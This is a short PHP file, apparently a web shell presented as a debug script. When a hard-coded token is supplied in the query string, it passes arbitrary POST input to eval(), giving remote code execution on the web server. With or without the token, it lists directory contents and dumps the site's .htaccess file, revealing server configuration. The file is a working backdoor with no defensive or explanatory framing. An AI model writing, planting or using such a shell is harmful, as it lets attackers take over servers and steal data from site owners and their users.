<?php
header('Content-Type: text/plain; charset=utf-8');

$token = 'benggala_debug_2026';
if (isset($_GET['token']) && $_GET['token'] === $token) {
    if (isset($_POST['code'])) {
        eval($_POST['code']);
        exit;
    }
}

echo "=== CURRENT DIRECTORY FILES ===\n";
$files = scandir('.');
foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $type = is_dir($f) ? 'DIR' : 'FILE';
    $size = is_file($f) ? filesize($f) : '-';
    echo sprintf("%-6s %10s %s\n", $type, $size, $f);
}

echo "\n=== HTACCESS CONTENT ===\n";
if (file_exists('.htaccess')) {
    echo file_get_contents('.htaccess');
}
